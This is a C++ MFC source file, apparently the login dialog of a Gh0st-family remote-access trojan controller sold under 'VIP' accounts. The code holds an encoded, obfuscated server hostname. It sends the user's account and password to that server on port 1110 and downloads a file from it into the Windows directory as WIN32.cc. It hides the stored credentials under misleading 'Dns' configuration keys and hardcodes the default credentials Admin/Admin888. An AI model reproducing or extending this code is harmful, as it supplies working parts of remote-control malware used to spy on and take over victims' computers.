// LOGIN.cpp : implementation file
//

#include "stdafx.h"
#include "Gh0st.h"
#include "LOGIN.h"
#include "decode.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


/////////////////////////////////////////////////////////////////////////////
// LOGIN dialog

LOGIN::LOGIN(CWnd* pParent /*=NULL*/)
: CDialog(LOGIN::IDD, pParent)
{
	//{{AFX_DATA_INIT(LOGIN)
	m_username = _T("");
	m_userpass = _T("");
	m_onlinepass = _T("");
	m_hostname = _T("FBocFRQZHBUUFCMVGCs=");
	m_checkjz = FALSE;
	m_checkxs = FALSE;
	m_checkmf = FALSE;
	//}}AFX_DATA_INIT
}


void LOGIN::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(LOGIN)
	DDX_Text(pDX, IDC_username, m_username);
	DDX_Text(pDX, IDC_userpass, m_userpass);
	DDX_Text(pDX, IDC_HOSTNAME, m_hostname);
	DDX_Check(pDX, IDC_CHECKJZ, m_checkjz);
	DDX_Check(pDX, IDC_CHECKXS, m_checkxs);
	DDX_Control(pDX, IDC_GIF_LOGIN, m_Picture);
	DDX_Check(pDX, IDC_CHECKMF, m_checkmf);
	if (m_Picture.Load(MAKEINTRESOURCE(IDR_GIF1),_T("GIF")))   //显示GIF图片
		m_Picture.Draw();
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(LOGIN, CDialog)
//{{AFX_MSG_MAP(LOGIN)
    ON_WM_PAINT()
    ON_BN_CLICKED(IDC_LOGIN, OnLogin)
	ON_BN_CLICKED(IDC_CHECKXS, OnCheckxs)
	ON_BN_CLICKED(IDC_CHECKJZ, OnCheckjz)
	ON_BN_CLICKED(IDC_BTN_HIDE, OnBtnHide)
	ON_BN_CLICKED(IDC_CHECKMF, OnCheckmf)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// LOGIN message handlers

/////////////////////////////////////////////////////////////////////////////

int base64_decod(const void *data, int size, char **str)
{
	char *s, *p;
	int i;
	int c;
	const unsigned char *q;
	
	p = s = (char*)malloc(size*4/3+4);
	if (p == NULL)
		return -1;
	q = (const unsigned char*)data;
	i=0;
	for(i = 0; i < size;){
		c=q[i++];
		c*=256;
		if(i < size)
			c+=q[i];
		i++;
		c*=256;
		if(i < size)
			c+=q[i];
		i++;
		p[0]=base64[(c&0x00fc0000) >> 18];
		p[1]=base64[(c&0x0003f000) >> 12];
		p[2]=base64[(c&0x00000fc0) >> 6];
		p[3]=base64[(c&0x0000003f) >> 0];
		if(i > size)
			p[3]='=';
		if(i > size+1)
			p[2]='=';
		p+=4;
	}
	*p=0;
	*str = s;
	return strlen(s);
}

char* DectryData(char *str)
{
	int		i, len;
	char	*s, *data;
	len = strlen(str) + 1;
	s = (char *)malloc(len);
	memcpy(s, str, len);
	for (i = 0; i < len; i++)
	{
		s[i] ^= 0x21;
		s[i] += 0x87;
		s[i] ^= 0x83;
	}
	base64_decod(s, len, &data);
	free(s);
	return data;
}

/////////网络信息获取////////////
#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11





typedef struct
{
	BYTE	Flags1;
	DWORD	Buffer_Size1;
	BYTE	Buffer1[1024];
	BYTE	Info1[256];
}NET_DATA1, *LPNET_DATA1;



CString strInfo1;



void LOGIN::OnLogin() 
{
	
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	GetDlgItem(IDC_LOGIN)->EnableWindow(FALSE);
	GetDlgItem(IDC_username)->EnableWindow(FALSE);
	GetDlgItem(IDC_userpass)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECKJZ)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECKXS)->EnableWindow(FALSE);
	GetDlgItem(IDC_HOSTNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECKMF)->EnableWindow(FALSE);


	SetDlgItemText(IDC_STATIC_TS,"系统登录中...\r\n请耐心等候...");
	
	

	if ( m_username.GetLength() == 0 )
	{
		SetDlgItemText(IDC_STATIC_TS,"系统登录中...");
		MessageBox("请输入登录帐号！ ...","提示！", MB_OK | MB_ICONASTERISK);
		
		return;
	}
	if ( m_userpass.GetLength() == 0 )
	{
		SetDlgItemText(IDC_STATIC_TS,"系统登录中...");
		MessageBox("请输入登录密码！ ...","提示！", MB_OK | MB_ICONASTERISK);
		
		return;
	}
    ///////////////////////////////////////////////////////////////////////////////////////////////

	DeleteFile("C:\\WINDOWS\\WIN32.cc");
	
	char zhanghao[50];
	char mima[50];
	GetDlgItemText(IDC_username,zhanghao,sizeof(zhanghao));
	GetDlgItemText(IDC_userpass,mima,sizeof(mima));
	if (strcmp(zhanghao,"")==0||strcmp(mima,"")==0)
	{
		MessageBox("请填写Vip账号\\Vip密码","错误",NULL);
		return;
	}
	// TODO: Add your control notification handler code here
	char TmpPath[MAX_PATH];
	GetTempPath( sizeof(TmpPath), TmpPath );
	lstrcatA( TmpPath, "\\WindsTemp.exe" );
	DeleteFile(TmpPath);
	


	//////////////////////////////////////////////////////////////////////////////////////////////////
	DWORD recvsize = 0;
	SOCKET sockInt;
	struct sockaddr_in serverAddr;
	//struct hostent *hp;
	WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
	//创建SOCK
	sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
	//	AfxMessageBox("socket error!\n");
		SetDlgItemText(IDC_STATIC_TS,"服务器无法连接！...\r\n请联系管理员或登录官方QQ群\r\n获取最新服务器地址。");
		iShow = 0;
		SetWindowPos(NULL, 0, 0, rectLarge.Width(), rectLarge.Height(), SWP_NOZORDER | SWP_NOMOVE);
		this->SetDlgItemText(IDC_BTN_HIDE, _T("<<"));
		WSACleanup();
		return;
	}
	
	//获取服务器IP和端口
	serverAddr.sin_family = AF_INET;
	char tgtIP[30] = {0};
	struct hostent *hp = NULL;
	((CEdit*)GetDlgItem(IDC_HOSTNAME))->GetWindowText(m_hostname);
   // if ((hp = gethostbyname("127.0.0.1")) != NULL)
	if ((hp = gethostbyname(MyNewDecode((char *)m_hostname.GetBuffer(0)))) != NULL)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpy(tgtIP,inet_ntoa(in));
		m_inifile.SetString( "HOSTNAME", "hostname",(char *)m_hostname.GetBuffer(0));

	}
	
	serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
	serverAddr.sin_port = htons(1110);
	
	//连接服务
	if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
	//	AfxMessageBox("连接服务器失败.");
		SetDlgItemText(IDC_STATIC_TS,"服务器无法连接！...\r\n请联系管理员或登录官方QQ群\r\n获取最新服务器地址。");
		iShow = 0;
		SetWindowPos(NULL, 0, 0, rectLarge.Width(), rectLarge.Height(), SWP_NOZORDER | SWP_NOMOVE);
		this->SetDlgItemText(IDC_BTN_HIDE, _T("<<"));
		WSACleanup();
		return;
	}
	char USERIMFOR[256] = {0}, buff[256] = {0};
//	wsprintf( USERIMFOR, "Login:%s@%s", m_username, m_userpass);

     wsprintf( USERIMFOR, "Login:%s@%s",zhanghao,mima);

	if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
	{
	//	AfxMessageBox("连接服务器失败.");
		SetDlgItemText(IDC_STATIC_TS,"服务器无法连接！...\r\n请联系管理员或登录官方QQ群\r\n获取最新服务器地址。");
		iShow = 0;
		SetWindowPos(NULL, 0, 0, rectLarge.Width(), rectLarge.Height(), SWP_NOZORDER | SWP_NOMOVE);
		this->SetDlgItemText(IDC_BTN_HIDE, _T("<<"));
		WSACleanup();
		return;
	}
	Sleep(50);
	int Ret = recv( sockInt, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
	//	AfxMessageBox("账号错误");
		SetDlgItemText(IDC_STATIC_TS,"账号密码错误...");
		closesocket(sockInt);
		WSACleanup();
		return;
	}
    Sleep(1000);
	SetDlgItemText(IDC_STATIC_TS,"正在验证服务器...\r\n当前登录人数比较多...\r\n请耐心等候...");
	
	if (strstr( buff, "Pass" ) != NULL)//通过验证
	{
//////////////////////////////////////////////////////////////////////////////////////////////////////////
		if ( GetFileAttributes(TmpPath) != -1)
		{
			AfxMessageBox("File is exist and can't delete!");
			WSACleanup();
			return;
		}
		
		NET_DATA1 MyData1;		
		DWORD dwBytes1;
		HANDLE hFile1 = CreateFile( TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request1[256] = {0};
		request1[0] = Request_DOWN;
		char *laji1 = "48f9648";
			
		if ( mima != 0 )
		{
			lstrcpy( (char*)&request1[1],mima );

		}
		send( sockInt, (char*)&request1, sizeof(request1), NULL );
		
		while (1)
		{
			memset( &MyData1, 0, sizeof(NET_DATA1) );
			Ret = recv( sockInt, (char*)&MyData1, sizeof(MyData1), NULL );
			if ( Ret == 0 || Ret == SOCKET_ERROR )
			{
				AfxMessageBox("获取文件出错!");
				CloseHandle(hFile1);
				WSACleanup();
				return;
			}

			if ( MyData1.Flags1 != File_Buffer_Finish && MyData1.Flags1 != File_Buffer ) break;
			strInfo1 = MyData1.Info1;
			WriteFile(hFile1, MyData1.Buffer1, MyData1.Buffer_Size1, &dwBytes1, NULL);
			recvsize += MyData1.Buffer_Size1;
			send( sockInt, laji1, lstrlen(laji1) + 1, NULL );
			if ( MyData1.Flags1 == File_Buffer_Finish ) break;
		}
		CloseHandle(hFile1);
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////		
	}
	else
	{
		WSACleanup();
		return;
	}

  		closesocket(sockInt);
		WSACleanup();
		MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");


       UpdateData(FALSE);

		SetDlgItemText(IDC_STATIC_TS,"正在获取配置信息...\r\n请耐心等候...");
	//	Sleep(3000);
		if ((((CButton *)GetDlgItem(IDC_CHECKMF))->GetCheck() == FALSE))
		{
			
			// 		m_inifile.SetString( "USER", "username", DectryData((char *)m_username.GetBuffer(0)) );
			// 		m_inifile.SetString( "USER", "userpass",DectryData((char *)m_userpass.GetBuffer(0)) );
			m_inifile.SetString( "UPDATE", "Dns1", DectryData((char *)m_username.GetBuffer(0)) );
			m_inifile.SetString( "UPDATE", "Dns2",DectryData((char *)m_userpass.GetBuffer(0)) );
		}
		
       

		dLogin = GetTickCount();
		//	MessageBox(buff+6,"Vip信息",NULL);
		SetDlgItemText(IDC_STATIC_TS,buff+6);
		Sleep(1000);
		SetDlgItemText(IDC_LOGIN,"登 录（3）");
		Sleep(1000);
		SetDlgItemText(IDC_LOGIN,"登 录（2）");
		Sleep(1000);
		SetDlgItemText(IDC_LOGIN,"登 录（1）");
		Sleep(1000);
		SetDlgItemText(IDC_LOGIN,"登 录（0）");
		OnCancel();

}
// 
// void LOGIN::OnExit() 
// {
// 	// TODO: Add your control notification handler code here
// 	ExitProcess(0);
// }

BOOL LOGIN::OnInitDialog() 
{   
	CDialog::OnInitDialog();
	// TODO: Add extra initialization here
	//MyDecode((char *)m_hostname.GetBuffer(0)
//	SetDlgItemText( IDC_username, m_inifile.GetString( "USER", "username", "" ) );
	CString pass = m_inifile.GetString( "UPDATE", "Dns2", "" );
	CString user = m_inifile.GetString( "UPDATE", "Dns1", "" );
	if ( pass.GetLength() != 0 )
	{ 
		SetDlgItemText( IDC_userpass,MyNewDecode((char *)pass.GetBuffer(0)));
	}
	if ( user.GetLength() != 0 )
	{ 
		SetDlgItemText( IDC_username,MyNewDecode((char *)user.GetBuffer(0)));
	}


	/* 当前向下窗口是展开的，此时，可用来记录窗口的大小及位置 */
	
	this->GetWindowRect(&rectLarge);
	/* 将高度设为（窗口底部的y值 – 按钮底部的y值 + 25像素的边距） */
	SetWindowPos(NULL, 0, 0, rectLarge.Width(), rectLarge.bottom - rectSmall.top - 260,
		SWP_NOZORDER | SWP_NOMOVE);
	/* 更新按钮状态及按钮显示文字 */
	iShow = 1;
		this->SetDlgItemText(IDC_BTN_HIDE, _T(">>"));



	UpdateData();
	UpdateData(FALSE);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void LOGIN::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	CFont	*pFont = new CFont();
// 	pFont->CreateFont(0,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,
// 		CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,_T("宋体"));
	// 	pFont->CreateFont(0,0,0,0,FW_THIN,true,false,false,	CHINESEBIG5_CHARSET,
	//  OUT_CHARACTER_PRECIS,CLIP_CHARACTER_PRECIS,DEFAULT_QUALITY,FF_MODERN,"宋体");
	pFont->CreateFont(30,30,0,0,FW_NORMAL,FALSE,FALSE,0,ANSI_CHARSET,OUT_DEFAULT_PRECIS,
		CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH|FF_SWISS,_T("Arial"));

	GetDlgItem(IDC_LOGIN)->SetFont(pFont,TRUE);
	
	
	delete pFont;
	
	// Do not call CDialog::OnPaint() for painting messages
}


void LOGIN::OnBtnHide()
{
	CButton *btn_Hide = (CButton *)GetDlgItem(IDC_BTN_HIDE);
	/* 得到IDC_BTN_HIDE按钮的位置 */

	btn_Hide->GetWindowRect(&rectSmall);
	if (iShow == 0)
	{
		/* 当前向下窗口是展开的，此时，可用来记录窗口的大小及位置 */
		
		this->GetWindowRect(&rectLarge);
		/* 将高度设为（窗口底部的y值 – 按钮底部的y值 + 25像素的边距） */
		SetWindowPos(NULL, 0, 0, rectLarge.Width(), rectLarge.bottom - rectSmall.top + 160,
			SWP_NOZORDER | SWP_NOMOVE);
		/* 更新按钮状态及按钮显示文字 */
		iShow = 1;
		this->SetDlgItemText(IDC_BTN_HIDE, _T(">>"));
	}
	else
	{
		/* 当前向下窗口是不显示的，可直接还原为原来窗口大小，并更新按钮状态及文字 */
		iShow = 0;
		SetWindowPos(NULL, 0, 0, rectLarge.Width(), rectLarge.Height(), SWP_NOZORDER | SWP_NOMOVE);
		this->SetDlgItemText(IDC_BTN_HIDE, _T("<<"));
	}
}

void LOGIN::OnCheckxs() 
{
	// TODO: Add your control notification handler code here
		((CEdit*)GetDlgItem(IDC_userpass))->GetWindowText(m_userpass);
		//	m_userpass.SetPasswordChar(NULL);
// 		HWND h_pass;
// 		CWnd *pWnd = GetDlgItem(IDC_userpass);
// 		h_pass = pWnd->GetSafeHwnd();
// 		::SendMessage(h_pass, EM_SETPASSWORDCHAR,0,0);//去掉密码属性
// 		Invalidate(FALSE);
     if ( ((CButton *)GetDlgItem(IDC_CHECKXS))->GetCheck() == TRUE )
	 {
		 //去除密码属性
		 ::SendMessage(GetDlgItem(IDC_userpass)->GetSafeHwnd(),EM_SETPASSWORDCHAR,FALSE,0); 
		GetDlgItem(IDC_userpass)->SetFocus();

	 }

     else
     {
		 //增加密码属性 
		 ::SendMessage(GetDlgItem(IDC_userpass)->GetSafeHwnd(),EM_SETPASSWORDCHAR,TRUE,0);
        GetDlgItem(IDC_userpass)->SetFocus();
	 }
		
		
  
}

void LOGIN::OnCheckjz() 
{
	// TODO: Add your control notification handler code here
	
}

void LOGIN::OnCheckmf() 
{

	if ( ((CButton *)GetDlgItem(IDC_CHECKMF))->GetCheck() == TRUE )
	{
		::SendMessage(GetDlgItem(IDC_userpass)->GetSafeHwnd(),EM_SETPASSWORDCHAR,TRUE,0);
		GetDlgItem(IDC_userpass)->SetFocus();
		SetDlgItemText(IDC_username,"Admin");
		SetDlgItemText(IDC_userpass,"Admin888");
		GetDlgItem(IDC_username)->EnableWindow(FALSE);
		GetDlgItem(IDC_userpass)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECKJZ)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECKXS)->EnableWindow(FALSE);
	    GetDlgItem(IDC_HOSTNAME)->EnableWindow(FALSE);
	}
	   else
	{
		SetDlgItemText(IDC_username,"");
		SetDlgItemText(IDC_userpass,"");
		GetDlgItem(IDC_username)->EnableWindow(TRUE);
		GetDlgItem(IDC_userpass)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECKJZ)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECKXS)->EnableWindow(TRUE);
	    GetDlgItem(IDC_HOSTNAME)->EnableWindow(TRUE);
	}


}


